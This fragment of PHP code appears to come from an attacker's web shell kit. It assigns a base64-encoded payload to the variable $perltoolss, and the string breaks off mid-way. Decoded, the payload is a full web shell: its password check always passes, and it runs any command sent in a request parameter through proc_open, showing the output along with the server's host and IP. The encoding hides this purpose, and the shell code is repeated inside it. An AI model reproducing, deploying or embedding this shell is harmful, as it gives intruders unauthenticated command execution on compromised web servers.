    $perltoolss = 'DQo8P3BocA0KDQokYWxpYXNlcyA9IGFycmF5KCdsYScgPT4gJ2xzIC1sYScsDQonbGwnID0+ICdscyAtbHZoRicsDQonZGlyJyA9PiAnbHMnICk7DQokcGFzc3dkID0gYXJyYXkoJycgPT4gJycpOw0KZXJyb3JfcmVwb3J0aW5nKDApOw0KY2xhc3MgcGhwdGhpZW5sZSB7DQoNCmZ1bmN0aW9uIGZvcm1hdFByb21wdCgpIHsNCiR1c2VyPXNoZWxsX2V4ZWMoIndob2FtaSIpOw0KJGhvc3Q9ZXhwbG9kZSgiLiIsIHNoZWxsX2V4ZWMoInVuYW1lIC1uIikpOw0KJF9TRVNTSU9OWydwcm9tcHQnXSA9ICIiLnJ0cmltKCR1c2VyKS4iIi4iQCIuIiIucnRyaW0oJGhvc3RbMF0pLiIiOw0KfQ0KDQpmdW5jdGlvbiBjaGVja1Bhc3N3b3JkKCRwYXNzd2QpIHsNCmlmKCFpc3NldCgkX1NFUlZFUlsnUEhQX0FVVEhfVVNFUiddKXx8DQohaXNzZXQoJF9TRVJWRVJbJ1BIUF9BVVRIX1BXJ10pIHx8DQohaXNzZXQoJHBhc3N3ZFskX1NFUlZFUlsnUEhQX0FVVEhfVVNFUiddXSkgfHwNCiRwYXNzd2RbJF9TRVJWRVJbJ1BIUF9BVVRIX1VTRVInXV0gIT0gJF9TRVJWRVJbJ1BIUF9BVVRIX1BXJ10pIHsNCkBzZXNzaW9uX3N0YXJ0KCk7DQpyZXR1cm4gdHJ1ZTsNCn0NCmVsc2Ugew0KQHNlc3Npb25fc3RhcnQoKTsNCnJldHVybiB0cnVlOw0KfQ0KfQ0KDQpmdW5jdGlvbiBpbml0VmFycygpDQp7DQppZiAoZW1wdHkoJF9TRVNTSU9OWydjd2QnXSkgfHwgIWVtcHR5KCRfUkVRVUVTVFsncmVzZXQnXSkpDQp7DQokX1NFU1NJT05bJ2N3ZCddID0gZ2V0Y3dkKCk7DQokX1NFU1NJT05bJ2hpc3RvcnknXSA9IGFycmF5KCk7DQokX1NFU1NJT05bJ291dHB1dCddID0gJyc7DQokX1JFUVVFU1RbJ2NvbW1hbmQnXSA9Jyc7DQp9DQp9DQoNCmZ1bmN0aW9uIGJ1aWxkQ29tbWFuZEhpc3RvcnkoKQ0Kew0KaWYoIWVtcHR5KCRfUkVRVUVTVFsnY29tbWFuZCddKSkNCnsNCmlmKGdldF9tYWdpY19xdW90ZXNfZ3BjKCkpDQp7DQokX1JFUVVFU1RbJ2NvbW1hbmQnXSA9IHN0cmlwc2xhc2hlcygkX1JFUVVFU1RbJ2NvbW1hbmQnXSk7DQp9DQoNCi8vIGRyb3Agb2xkIGNvbW1hbmRzIGZyb20gbGlzdCBpZiBleGlzdHMNCmlmICgoJGkgPSBhcnJheV9zZWFyY2goJF9SRVFVRVNUWydjb21tYW5kJ10sICRfU0VTU0lPTlsnaGlzdG9yeSddKSkgIT09IGZhbHNlKQ0Kew0KdW5zZXQoJF9TRVNTSU9OWydoaXN0b3J5J11bJGldKTsNCn0NCmFycmF5X3Vuc2hpZnQoJF9TRVNTSU9OWydoaXN0b3J5J10sICRfUkVRVUVTVFsnY29tbWFuZCddKTsNCg0KLy8gYXBwZW5kIGNvbW1tYW5kICovDQokX1NFU1NJT05bJ291dHB1dCddIC49ICJ7JF9TRVNTSU9OWydwcm9tcHQnXX0iLiI6PiIuInskX1JFUVVFU1RbJ2NvbW1hbmQnXX0iLiJcbiI7DQp9DQp9DQoNCmZ1bmN0aW9uIGJ1aWxkSmF2YUhpc3RvcnkoKQ0Kew0KLy8gYnVpbGQgY29tbWFuZCBoaXN0b3J5IGZvciB1c2UgaW4gdGhlIEphdmFTY3JpcHQNCmlmIChlbXB0eSgkX1NFU1NJT05bJ2hpc3RvcnknXSkpDQp7DQokX1NFU1NJT05bJ2pzX2NvbW1hbmRfaGlzdCddID0gJyIiJzsNCn0NCmVsc2UNCnsNCiRlc2NhcGVkID0gYXJyYXlfbWFwKCdhZGRzbGFzaGVzJywgJF9TRVNTSU9OWydoaXN0b3J5J10pOw0KJF9TRVNTSU9OWydqc19jb21tYW5kX2hpc3QnXSA9ICciIiwgIicgLiBpbXBsb2RlKCciLCAiJywgJGVzY2FwZWQpIC4gJyInOw0KfQ0KfQ0KDQpmdW5jdGlvbiBvdXRwdXRIYW5kbGUoJGFsaWFzZXMpDQp7DQppZiAoZXJlZygnXltbOmJsYW5rOl1dKmNkW1s6Ymxhbms6XV0qJCcsICRfUkVRVUVTVFsnY29tbWFuZCddKSkNCnsNCiRfU0VTU0lPTlsnY3dkJ10gPSBnZXRjd2QoKTsgLy9kaXJuYW1lKF9fRklMRV9fKTsNCn0NCmVsc2VpZihlcmVnKCdeW1s6Ymxhbms6XV0qY2RbWzpibGFuazpdXSsoW147XSspJCcsICRfUkVRVUVTVFsnY29tbWFuZCddLCAkcmVncykpDQp7DQovLyBUaGUgY3VycmVudCBjb21tYW5kIGlzICdjZCcsIHdoaWNoIHdlIGhhdmUgdG8gaGFuZGxlIGFzIGFuIGludGVybmFsIHNoZWxsIGNvbW1hbmQuDQovLyBhYnNvbHV0ZS9yZWxhdGl2ZSBwYXRoID8iDQooJHJlZ3NbMV1bMF0gPT0gJy8nKSA/ICRuZXdfZGlyID0gJHJlZ3NbMV0gOiAkbmV3X2RpciA9ICRfU0VTU0lPTlsnY3dkJ10gLiAnLycgLiAkcmVnc1sxXTsNCg0KLy8gY29zbWV0aWNzDQp3aGlsZSAoc3RycG9zKCRuZXdfZGlyLCAnLy4vJykgIT09IGZhbHNlKQ0KJG5ld19kaXIgPSBzdHJfcmVwbGFjZSgnLy4vJywgJy8nLCAkbmV3X2Rpcik7DQp3aGlsZSAoc3RycG9zKCRuZXdfZGlyLCAnLy8nKSAhPT0gZmFsc2UpDQokbmV3X2RpciA9IHN0cl9yZXBsYWNlKCcvLycsICcvJywgJG5ld19kaXIpOw0Kd2hpbGUgKHByZWdfbWF0Y2goJ3wvXC5cLig/IVwuKXwnLCAkbmV3X2RpcikpDQokbmV3X2RpciA9IHByZWdfcmVwbGFjZSgnfC8/W14vXSsvXC5cLig/IVwuKXwnLCAnJywgJG5ld19kaXIpOw0KDQppZihlbXB0eSgkbmV3X2RpcikpOiAkbmV3X2RpciA9ICIvIjsgZW5kaWY7DQoNCihAY2hkaXIoJG5ld19kaXIpKSA/ICRfU0VTU0lPTlsnY3dkJ10gPSAkbmV3X2RpciA6ICRfU0VTU0lPTlsnb3V0cHV0J10gLj0gImNvdWxkIG5vdCBjaGFuZ2UgdG86ICRuZXdfZGlyXG4iOw0KfQ0KZWxzZQ0Kew0KLyogVGhlIGNvbW1hbmQgaXMgbm90IGEgJ2NkJyBjb21tYW5kLCBzbyB3ZSBleGVjdXRlIGl0IGFmdGVyDQoqIGNoYW5naW5nIHRoZSBkaXJlY3RvcnkgYW5kIHNhdmUgdGhlIG91dHB1dC4gKi8NCmNoZGlyKCRfU0VTU0lPTlsnY3dkJ10pOw0KDQovKiBBbGlhcyBleHBhbnNpb24uICovDQokbGVuZ3RoID0gc3RyY3NwbigkX1JFUVVFU1RbJ2NvbW1hbmQnXSwgIiBcdCIpOw0KJHRva2VuID0gc3Vic3RyKEAkX1JFUVVFU1RbJ2NvbW1hbmQnXSwgMCwgJGxlbmd0aCk7DQppZiAoaXNzZXQoJGFsaWFzZXNbJHRva2VuXSkpDQokX1JFUVVFU1RbJ2NvbW1hbmQnXSA9ICRhbGlhc2VzWyR0b2tlbl0gLiBzdWJzdHIoJF9SRVFVRVNUWydjb21tYW5kJ10sICRsZW5ndGgpOw0KDQokcCA9IHByb2Nfb3BlbihAJF9SRVFVRVNUWydjb21tYW5kJ10sDQphcnJheSgxID0+IGFycmF5KCdwaXBlJywgJ3cnKSwNCjIgPT4gYXJyYXkoJ3BpcGUnLCAndycpKSwNCiRpbyk7DQoNCi8qIFJlYWQgb3V0cHV0IHNlbnQgdG8gc3Rkb3V0LiAqLw0Kd2hpbGUgKCFmZW9mKCRpb1sxXSkpIHsNCiRfU0VTU0lPTlsnb3V0cHV0J10gLj0gaHRtbHNwZWNpYWxjaGFycyhmZ2V0cygkaW9bMV0pLEVOVF9DT01QQVQsICdVVEYtOCcpOw0KfQ0KLyogUmVhZCBvdXRwdXQgc2VudCB0byBzdGRlcnIuICovDQp3aGlsZSAoIWZlb2YoJGlvWzJdKSkgew0KJF9TRVNTSU9OWydvdXRwdXQnXSAuPSBodG1sc3BlY2lhbGNoYXJzKGZnZXRzKCRpb1syXSksRU5UX0NPTVBBVCwgJ1VURi04Jyk7DQp9DQoNCmZjbG9zZSgkaW9bMV0pOw0KZmNsb3NlKCRpb1syXSk7DQpwcm9jX2Nsb3NlKCRwKTsNCn0NCn0NCn0NCi8vIGVuZCBwaHAga3ltbGpuaw0KDQovKiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgIyMjIyMjIyMjDQojIyBUaGUgbWFpbiB0aGluZyBzdGFydHMgaGVyZQ0KIyMgQWxsIG91dHB1dCBpc3QgWEhUTUwNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjICMjIyMjIyMjKi8NCg0KJHRlcm1pbmFsPW5ldyBwaHB0aGllbmxlOw0KDQpAc2Vzc2lvbl9zdGFydCgpOw0KDQokdGVybWluYWwtPmluaXRWYXJzKCk7DQokdGVybWluYWwtPmJ1aWxkQ29tbWFuZEhpc3RvcnkoKTsNCiR0ZXJtaW5hbC0+YnVpbGRKYXZhSGlzdG9yeSgpOw0KaWYoIWlzc2V0KCRfU0VTU0lPTlsncHJvbXB0J10pKTogJHRlcm1pbmFsLT5mb3JtYXRQcm9tcHQoKTsgZW5kaWY7DQokdGVybWluYWwtPm91dHB1dEhhbmRsZSgkYWxpYXNlcyk7DQoNCmhlYWRlcignQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9VVRGLTgnKTsNCmVjaG8gJzw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04Ij8+JyAuICJcbiI7DQo/Pg0KDQo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIFhIVE1MIDEuMCBTdHJpY3QvL0VOIg0KImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXN0cmljdC5kdGQiPg0KPGh0bWwgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiIHhtbDpsYW5nPSJlbiIgbGFuZz0iZW4iPg0KPGhlYWQ+DQo8dGl0bGU+PD9waHAgZWNobyAiV2Vic2l0ZSA6ICIuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLiIiOz8+IHwgPD9waHAgZWNobyAiSVAgOiAiLmdldGhvc3RieW5hbWUoJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10pLiIiOz8+PC90aXRsZT4NCg0KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIGxhbmd1YWdlPSJKYXZhU2NyaXB0Ij4NCnZhciBjdXJyZW50X2xpbmUgPSAwOw0KdmFyIGNvbW1hbmRfaGlzdCA9IG5ldyBBcnJheSg8P3BocCBlY2hvICRfU0VTU0lPTlsnanNfY29tbWFuZF9oaXN0J107ID8+KTsNCnZhciBsYXN0ID0gMDsNCg0KZnVuY3Rpb24ga2V5KGUpIHsNCmlmICghZSkgdmFyIGUgPSB3aW5kb3cuZXZlbnQ7DQoNCmlmIChlLmtleUNvZGUgPT0gMzggJiYgY3VycmVudF9saW5lIDwgY29tbWFuZF9oaXN0Lmxlbmd0aC0xKSB7DQpjb21tYW5kX2hpc3RbY3VycmVudF9saW5lXSA9IGRvY3VtZW50LnNoZWxsLmNvbW1hbmQudmFsdWU7DQpjdXJyZW50X2xpbmUrKzsNCmRvY3VtZW50LnNoZWxsLmNvbW1hbmQudmFsdWUgPSBjb21tYW5kX2hpc3RbY3VycmVudF9saW5lXTsNCn0NCg0KaWYgKGUua2V5Q29kZSA9PSA0MCAmJiBjdXJyZW50X2xpbmUgPiAwKSB7DQpjb21tYW5kX2hpc3RbY3VycmVudF9saW5lXSA9IGRvY3VtZW50LnNoZWxsLmNvbW1hbmQudmFsdWU7DQpjdXJyZW50X2xpbmUtLTsNCmRvY3VtZW50LnNoZWxsLmNvbW1hbmQudmFsdWUgPSBjb21tYW5kX2hpc3RbY3VycmVudF9saW5lXTsNCn0NCg0KfQ0KDQpmdW5jdGlvbiBpbml0KCkgew0KZG9jdW1lbnQuc2hlbGwuc2V0QXR0cmlidXRlKCJhdXRvY29tcGxldGUiLCAib2ZmIik7DQpkb2N1bWVudC5zaGVsbC5vdXRwdXQuc2Nyb2xsVG9wID0gZG9jdW1lbnQuc2hlbGwub3V0cHV0LnNjcm9sbEhlaWdodDsNCmRvY3VtZW50LnNoZWxsLmNvbW1hbmQuZm9jdXMoKTsNCn0NCg0KPC9zY3JpcHQ+DQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPg0KYm9keSB7Zm9udC1mYW1pbHk6IHNhbnMtc2VyaWY7IGNvbG9yOiBibGFjazsgYmFja2dyb3VuZDogd2hpdGU7fQ0KdGFibGV7d2lkdGg6IDEwMCU7IGhlaWdodDogMzAwcHg7IGJvcmRlcjogMXB4ICMwMDAwMDAgc29saWQ7IHBhZGRpbmc6IDBweDsgbWFyZ2luOiAwcHg7fQ0KdGQuaGVhZHtiYWNrZ3JvdW5kLWNvbG9yOiAjNTI5QURFOyBjb2xvcjogI0ZGRkZGRjsgZm9udC13ZWlnaHQ6NzAwOyBib3JkZXI6IG5vbmU7IHRleHQtYWxpZ246IGNlbnRlcjsgZm9udC1zdHlsZTogaXRhbGljfQ0KdGV4dGFyZWEge3dpZHRoOiAxMDAlOyBib3JkZXI6IG5vbmU7IHBhZGRpbmc6IDJweCAycHggMnB4OyBjb2xvcjogI0NDQ0NDQzsgYmFja2dyb3VuZC1jb2xvcjogIzAwMDAwMDt9DQpwLnByb21wdCB7Zm9udC1mYW1pbHk6IG1vbm9zcGFjZTsgbWFyZ2luOiAwcHg7IHBhZGRpbmc6IDBweCAycHggMnB4OyBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwMDAwOyBjb2xvcjogI0NDQ0NDQzt9DQppbnB1dC5wcm9tcHQge2JvcmRlcjogbm9uZTsgZm9udC1mYW1pbHk6IG1vbm9zcGFjZTsgYmFja2dyb3VuZC1jb2xvcjogIzAwMDAwMDsgY29sb3I6ICNDQ0NDQ0M7fQ0KPGJvZHkgYmFja2dyb3VuZD0iaHR0cDovL2kuaGl6bGlyZXNpbS5jb20vRWw3eVdCLnBuZyI+DQoNCjwvc3R5bGU+DQo8L2hlYWQ+DQo8Ym9keSBvbmxvYWQ9ImluaXQoKSI+DQo8P3BocCBpZiAoZW1wdHkoJF9SRVFVRVNUWydyb3dzJ10pKSAkX1JFUVVFU1RbJ3Jvd3MnXSA9IDI2OyA/Pg0KPHRhYmxlIGNlbGxwYWRkaW5nPSIwIiBjZWxsc3BhY2luZz0iMCI+DQo8dHI+PHRkIGNsYXNzPSJoZWFkIiBzdHlsZT0iY29sb3I6ICMwMDAwMDA7Ij48Yj5YPC9iPjwvdGQ+DQo8dGQgY2xhc3M9ImhlYWQiPjw/cGhwIGVjaG8gJF9TRVNTSU9OWydwcm9tcHQnXS4iOiIuIiRfU0VTU0lPTltjd2RdIjsgPz4NCjwvdGQ+PC90cj4NCjx0cj48dGQgd2lkdGg9JzEwMCUnIGhlaWdodD0nMTAwJScgY29sc3Bhbj0nMic+PGZvcm0gbmFtZT0ic2hlbGwiIGFjdGlvbj0iPD9waHAgZWNobyAkX1NFUlZFUlsnUEhQX1NFTEYnXTs/PiIgbWV0aG9kPSJwb3N0Ij4NCjx0ZXh0YXJlYSBuYW1lPSJvdXRwdXQiIHJlYWRvbmx5PSJyZWFkb25seSIgY29scz0iODUiIHJvd3M9Ijw/cGhwIGVjaG8gJF9SRVFVRVNUWydyb3dzJ10gPz4iPg0KPD9waHANCiRsaW5lcyA9IHN1YnN0cl9jb3VudCgkX1NFU1NJT05bJ291dHB1dCddLCAiXG4iKTsNCiRwYWRkaW5nID0gc3RyX3JlcGVhdCgiXG4iLCBtYXgoMCwgJF9SRVFVRVNUWydyb3dzJ10rMSAtICRsaW5lcykpOw0KZWNobyBydHJpbSgkcGFkZGluZyAuICRfU0VTU0lPTlsnb3V0cHV0J10pOw0KPz4NCjwvdGV4dGFyZWE+DQo8cCBjbGFzcz0icHJvbXB0Ij48P3BocCBlY2hvICRfU0VTU0lPTlsncHJvbXB0J10uIjo+IjsgPz4NCjxpbnB1dCBjbGFzcz0icHJvbXB0IiBuYW1lPSJjb21tYW5kIiB0eXBlPSJ0ZXh0IiBvbmtleXVwPSJrZXkoZXZlbnQpIiBzaXplPSI1MCIgdGFiaW5kZXg9IjEiPg0KPC9wPg0KDQo8PyAvKjxwPg0KPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkV4ZWN1dGUgQ29tbWFuZCIgLz4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9InJlc2V0IiB2YWx1ZT0iUmVzZXQiIC8+DQpSb3dzOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0icm93cyIgdmFsdWU9Ijw/cGhwIGVjaG8gJF9SRVFVRVNUWydyb3dzJ10gPz4iIC8+DQo8L3A+DQoNCiovDQo/Pg0KPC9mb3JtPjwvdGQ+PC90cj4NCjwvYm9keT4NCjwvaHRtbD4NCjw/cGhwID8+DQo8P3BocA0KDQokYWxpYXNlcyA9IGFycmF5KCdsYScgPT4gJ2xzIC1sYScsDQonbGwnID0+ICdscyAtbHZoRicsDQonZGlyJyA9PiAnbHMnICk7DQokcGFzc3dkID0gYXJyYXkoJycgPT4gJycpOw0KZXJyb3JfcmVwb3J0aW5nKDEpOw0KY2xhc3MgcGhwdGhpZW5sZSB7DQoNCmZ1bmN0aW9uIGZvcm1hdFByb21wdCgpIHsNCiR1c2VyPXNoZWxsX2V4ZWMoIndob2FtaSIpOw0KJGhvc3Q9ZXhwbG9kZSgiLiIsIHNoZWxsX2V4ZWMoInVuYW1lIC1uIikpOw0KJF9TRVNTSU9OWydwcm9tcHQnXSA9ICIiLnJ0cmltKCR1c2VyKS4iIi4iQCIuIiIucnRyaW0oJGhvc3RbMF0pLiIiOw0KfQ0KDQpmdW5jdGlvbiBjaGVja1Bhc3N3b3JkKCRwYXNzd2QpIHsNCmlmKCFpc3NldCgkX1NFUlZFUlsnUEhQX0FVVEhfVVNFUiddKXx8DQohaXNzZXQoJF9TRVJWRVJbJ1BIUF9BVVRIX1BXJ10pIHx8DQohaXNzZXQoJHBhc3N3ZFskX1NFUlZFUlsnUEhQX0FVVEhfVVNFUiddXSkgfHwNCiRwYXNzd2RbJF9TRVJWRVJbJ1BIUF9BVVRIX1VTRVInXV0gIT0gJF9TRVJWRVJbJ1BIUF9BVVRIX1BXJ10pIHsNCkBzZXNzaW9uX3N0YXJ0KCk7DQpyZXR1cm4gdHJ1ZTsNCn0NCmVsc2Ugew0KQHNlc3Npb25fc3RhcnQoKTsNCnJldHVybiB0cnVlOw0KfQ0KfQ0KDQpmdW5jdGlvbiBpbml0VmFycygpDQp7DQppZiAoZW1wdHkoJF9TRVNTSU9OWydjd2QnXSkgfHwgIWVtcHR5KCRfUkVRVUVTVFsncmVzZXQnXSkpDQp7DQokX1NFU1NJT05bJ2N3ZCddID0gZ2V0Y3dkKCk7DQokX1NFU1NJT05bJ2hpc3RvcnknXSA9IGFycmF5KCk7DQokX1NFU1NJT05bJ291dHB1dCddID0gJyc7DQokX1JFUVVFU1RbJ2NvbW1hbmQnXSA9Jyc7DQp9DQp9DQoNCmZ1bmN0aW9uIGJ1aWxkQ29tbWFuZEhpc3RvcnkoKQ0Kew0KaWYoIWVtcHR5KCRfUkVRVUVTVFsnY29tbWFuZCddKSkNCnsNCmlmKGdldF9tYWdpY19xdW90ZXNfZ3BjKCkpDQp7DQokX1JFUVVFU1RbJ2NvbW1hbmQnXSA9IHN0cmlwc2xhc2hlcygkX1JFUVVFU1RbJ2NvbW1hbmQnXSk7DQp9DQoNCi8vIGRyb3Agb2xkIGNvbW1hbmRzIGZyb20gbGlzdCBpZiBleGlzdHMNCmlmICgoJGkgPSBhcnJheV9zZWFyY2goJF9SRVFVRVNUWydjb21tYW5kJ10sICRfU0VTU0lPTlsnaGlzdG9yeSddKSkgIT09IGZhbHNlKQ0Kew0KdW5zZXQoJF9TRVNTSU9OWydoaXN0b3J5J11bJGldKTsNCn0NCmFycmF5X3Vuc2hpZnQoJF9TRVNTSU9OWydoaXN0b3J5J10sICRfUkVRVUVTVFsnY29tbWFuZCddKTsNCg0KLy8gYXBwZW5kIGNvbW1tYW5kICovDQokX1NFU1NJT05bJ291dHB1dCddIC49ICJ7JF9TRVNTSU9OWydwcm9tcHQnXX0iLiI6PiIuInskX1JFUVVFU1RbJ2NvbW1hbmQnXX0iLiJcbiI7DQp9DQp9DQoNCmZ1bmN0aW9uIGJ1aWxkSmF2YUhpc3RvcnkoKQ0Kew0KLy8gYnVpbGQgY29tbWFuZCBoaXN0b3J5IGZvciB1c2UgaW4gdGhlIEphdmFTY3JpcHQNCmlmIChlbXB0eSgkX1NFU1NJT05bJ2hpc3RvcnknXSkpDQp7DQokX1NFU1NJT05bJ2pzX2NvbW1hbmRfaGlzdCddID0gJyIiJzsNCn0NCmVsc2UNCnsNCiRlc2NhcGVkID0gYXJyYXlfbWFwKCdhZGRzbGFzaGVzJywgJF9TRVNTSU9OWydoaXN0b3J5J10pOw0KJF9TRVNTSU9OWydqc19jb21tYW5kX2hpc3QnXSA9ICciIiwgIicgLiBpbXBsb2RlKCciLCAiJywgJGVzY2FwZWQpIC4gJyInOw0KfQ0KfQ0KDQpmdW5jdGlvbiBvdXRwdXRIYW5kbGUoJGFsaWFzZXMpDQp7DQppZiAoZXJlZygnXltbOmJsYW5rOl1dKmNkW1s6Ymxhbms6XV0qJCcsICRfUkVRVUVTVFsnY29tbWFuZCddKSkNCnsNCiRfU0VTU0lPTlsnY3dkJ10gPSBnZXRjd2QoKTsgLy9kaXJuYW1lKF9fRklMRV9fKTsNCn0NCmVsc2VpZihlcmVnKCdeW1s6Ymxhbms6XV0qY2RbWzpibGFuazpdXSsoW147XSspJCcsICRfUkVRVUVTVFsnY29tbWFuZCddLCAkcmVncykpDQp7DQovLyBUaGUgY3VycmVudCBjb21tYW5kIGlzICdjZCcsIHdoaWNoIHdlIGhhdmUgdG8gaGFuZGxlIGFzIGFuIGludGVybmFsIHNoZWxsIGNvbW1hbmQuDQovLyBhYnNvbHV0ZS9yZWxhdGl2ZSBwYXRoID8iDQooJHJlZ3NbMV1bMF0gPT0gJy8nKSA/ICRuZXdfZGlyID0gJHJlZ3NbMV0gOiAkbmV3X2RpciA9ICRfU0VTU0lPTlsnY3dkJ10gLiAnLycgLiAkcmVnc1sxXTsNCg0KLy8gY29zbWV0aWNzDQp3aGlsZSAoc3RycG9zKCRuZXdfZGlyLCAnLy4vJykgIT09IGZhbHNlKQ0KJG5ld19kaXIgPSBzdHJfcmVwbGFjZSgnLy4vJywgJy8nLCAkbmV3X2Rpcik7DQp3aGlsZSAoc3RycG9zKCRuZXdfZGlyLCAnLy8nKSAhPT0gZmFsc2UpDQokbmV3X2RpciA9IHN0cl9yZXBsYWNlKCcvLycsICcvJywgJG5ld19kaXIpOw0Kd2hpbGUgKHByZWdfbWF0Y2goJ3wvXC5cLig/IVwuKXwnLCAkbmV3X2RpcikpDQokbmV3X2RpciA9IHByZWdfcmVwbGFjZSgnfC8/W14vXSsvXC5cLig/IVwuKXwnLCAnJywgJG5ld19kaXIpOw0KDQppZihlbXB0eSgkbmV3X2RpcikpOiAkbmV3X2RpciA9ICIvIjsgZW5kaWY7DQoNCihAY2hkaXIoJG5ld19kaXIpKSA/ICRfU0VTU0lPTlsnY3dkJ10gPSAkbmV3X2RpciA6ICRfU0VTU0lPTlsnb3V0cHV0J10gLj0gImNvdWxkIG5vdCBjaGFuZ2UgdG86ICRuZXdfZGlyXG4iOw0KfQ0KZWxzZQ0Kew0KLyogVGhlIGNvbW1hbmQgaXMgbm90IGEgJ2NkJyBjb21tYW5kLCBzbyB3ZSBleGVjdXRlIGl0IGFmdGVyDQoqIGNoYW5naW5nIHRoZSBkaXJlY3RvcnkgYW5kIHNhdmUgdGhlIG91dHB1dC4gKi8NCmNoZGlyKCRfU0VTU0lPTlsnY3dkJ10pOw0KDQovKiBBbGlhcyBleHBhbnNpb24uICovDQokbGVuZ3RoID0gc3RyY3NwbigkX1JFUVVFU1RbJ2NvbW1hbmQnXSwgIiBcdCIpOw0KJHRva2VuID0gc3Vic3RyKEAkX1JFUVVFU1RbJ2NvbW1hbmQnXSwgMCwgJGxlbmd0aCk7DQppZiAoaXNzZXQoJGFsaWFzZXNbJHRva2VuXSkpDQokX1JFUVVFU1RbJ2NvbW1hbmQnXSA9ICRhbGlhc2VzWyR0b2tlbl0gLiBzdWJzdHIoJF9SRVFVRVNUWydjb21tYW5kJ10sICRsZW5ndGgpOw0KDQokcCA9IHByb2Nfb3BlbihAJF9SRVFVRVNUWydjb21tYW5kJ10sDQphcnJheSgxID0+IGFycmF5KCdwaXBlJywgJ3cnKSwNCjIgPT4gYXJyYXkoJ3BpcGUnLCAndycpKSwNCiRpbyk7DQoNCi8qIFJlYWQgb3V0cHV0IHNlbnQgdG8gc3Rkb3V0LiAqLw0Kd2hpbGUgKCFmZW9mKCRpb1sxXSkpIHsNCiRfU0VTU0lPTlsnb3V0cHV0J10gLj0gaHRtbHNwZWNpYWxjaGFycyhmZ2V0cygkaW9bMV0pLEVOVF9DT01QQVQsICdVVEYtOCcpOw0KfQ0KLyogUmVhZCBvdXRwdXQgc2VudCB0byBzdGRlcnIuICovDQp3aGlsZSAoIWZlb2YoJGlvWzJdKSkgew0KJF9TRVNTSU9OWydvdXRwdXQnXSAuPSBodG1sc3BlY2lhbGNoYXJzKGZnZXRzKCRpb1syXSksRU5UX0NPTVBBVCwgJ1VURi04Jyk7DQp9DQoNCmZjbG9zZSgkaW9bMV0pOw0KZmNsb3NlKCRpb1syXSk7DQpwcm9jX2Nsb3NlKCRwKTsNCn0NCn0NCn0gLy8gZW5kIHBocHRoaWVubGUNCg0KLyojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjICMjIyMjIyMjIw0KIyMgVGhlIG1haW4gdGhpbmcgc3RhcnRzIGhlcmUNCiMjIEFsbCBvdXRwdXQgaXN0IFhIVE1MDQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyAjIyMjIyMjIyovDQokdGVybWluYWw9bmV3IHBocHRoaWVubGU7DQpAc2Vzc2lvbl9zdGFydCgpOw0KJHRlcm1pbmFsLT5pbml0VmFycygpOw0KJHRlcm1pbmFsLT5idWlsZENvbW1hbmRIaXN0b3J5KCk7DQokdGVybWluYWwtPmJ1aWxkSmF2YUhpc3RvcnkoKTsNCmlmKCFpc3NldCgkX1NFU1NJT05bJ3Byb21wdCddKSk6ICR0ZXJtaW5hbC0+Zm9ybWF0UHJvbXB0KCk7IGVuZGlmOw0KJHRlcm1pbmFsLT5vdXRwdXRIYW5kbGUoJGFsaWFzZXMpOw0KDQpoZWFkZXIoJ0NvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04Jyk7DQplY2hvICc8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJVVEYtOCI/PicgLiAiXG4iOw0KLyojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjICMjIyMjIyMjIw0KIyMgc2FmZSBtb2RlIGluY3JlYXNlDQojIyBibG9xdWUgZm9uY3Rpb24NCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjICMjIyMjIyMjKi8NCj8+DQo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIFhIVE1MIDEuMCBTdHJpY3QvL0VOIg0KImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXN0cmljdC5kdGQiPg0KPGh0bWwgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiIHhtbDpsYW5nPSJlbiIgbGFuZz0iZW4iPg0KPGhlYWQ+DQo8dGl0bGU+PD9waHAgZWNobyAiV2Vic2l0ZSA6ICIuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLiIiOz8+IHwgPD9waHAgZWNobyAiSVAgOiAiLmdldGhvc3RieW5hbWUoJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10pLiIiOz8+PC90aXRsZT4NCjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBsYW5ndWFnZT0iSmF2YVNjcmlwdCI+DQp2YXIgY3VycmVudF9saW5lID0gMDsNCnZhciBjb21tYW5kX2hpc3QgPSBuZXcgQXJyYXkoPD9waHAgZWNobyAkX1NFU1NJT05bJ2pzX2NvbW1hbmRfaGlzdCddOyA/Pik7DQp2YXIgbGFzdCA9IDA7DQpmdW5jdGlvbiBrZXkoZSkgew0KaWYgKCFlKSB2YXIgZSA9IHdpbmRvdy5ldmVudDsNCmlmIChlLmtleUNvZGUgPT0gMzggJiYgY3Vy